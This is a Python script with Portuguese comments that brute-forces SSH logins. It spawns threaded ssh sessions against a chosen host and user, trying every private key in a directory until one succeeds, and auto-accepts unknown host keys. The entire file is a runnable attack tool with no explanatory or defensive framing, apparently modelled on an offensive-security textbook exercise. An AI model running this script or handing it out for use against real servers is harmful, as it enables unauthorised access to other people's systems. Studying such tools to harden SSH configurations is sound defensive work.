#!/usr/bin/python
# -*- coding: utf-8 -*-

import pexpect
import optparse
import os
from threading import *

# Seta 5 threads no maximo
maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)

# Seta as variaveis globais com valores default
Stop = False
Fails = 0


def connect(user, host, keyfile, release):
    """ Funcao para conectar via ssh no host alvo """

    # Variaveis globais
    global Stop
    global Fails

    try:
        # variaveis com possiveis retornos
        perm_denied = 'Permission denied'
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'
        # parametro opcional
        opt = ' -o PasswordAuthentication=no'
        # Comando ssh que vai ser enviado
        connStr = 'ssh {user}@{host} -i {key}{opt}'.format(user=user, host=host, key=keyfile, opt=opt)
        # Executa o comando ssh
        child = pexpect.spawn(connStr)
        # Lista com a espera de alguns possiveis retornos
        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, '$', '#'])
        # Se retornar 2, conseguiu conectar, mas teve uma interacao
        if ret == 2:
            print('[-] Adding Host to ~/.ssh/known_hosts')
            # Enviar 'Yes' para o prompt
            child.sendline('yes')
            # Chama novamente a funcao de conexao
            connect(user, host, keyfile, False)
        # Se retornou 3, erro ao conectar
        elif ret == 3:
            print('[-] Connection Closed By Remote Host')
            Fails += 1
        # Se retornou um valor maior que 3 conseguiu conexao
        elif ret > 3:
            print('[+] Success. %s' % (str(keyfile)))
            Stop = True
    finally:
        # Se conectou e nao caiu na expection, termina a conexao
        if release:
            connection_lock.release()


def main():
    """ Funcao principal """

    # Parse explicando como deve ser a chamada do script
    parser = optparse.OptionParser('usage %prog -H <target host> -u <user> -d <directory>')

    # Separa os parametros solicitados
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-d', dest='passDir', type='string', help='specify directory with keys')
    parser.add_option('-u', dest='user', type='string', help='specify the user')

    # Faz o parse dos parametros
    (options, args) = parser.parse_args()
    host = options.tgtHost
    passDir = options.passDir
    user = options.user

    # Se nao receber os parametros solicitados para o script
    if not host or not passDir or not user:
        print(parser.usage)
        exit(0)

    # Loopa todas as linhas do arquivo de senhas
    for filename in os.listdir(passDir):
        # Se ja encontrou uma chave que conecte, para o script
        if Stop:
            print('[*] Exiting: Key Found.')
            exit(0)
        # Se tentou muitas vezes, para o scritpt
        if Fails > 5:
            print('[!] Exiting: Too Many Connections Closed By Remote Host.')
            print('[!] Adjust number of simultaneous threads.')
            exit(0)

        # Adiquire um block, blocking ou nom-blocling para a thred em semaforo
        connection_lock.acquire()
        fullpath = os.path.join(passDir, filename)
        print('[-] Testing keyfile %s' % (str(fullpath)))
        t = Thread(target=connect, args=(user, host, fullpath, True))
        t.start()

# Chama a funcao main principal
if __name__ == '__main__':
    main()
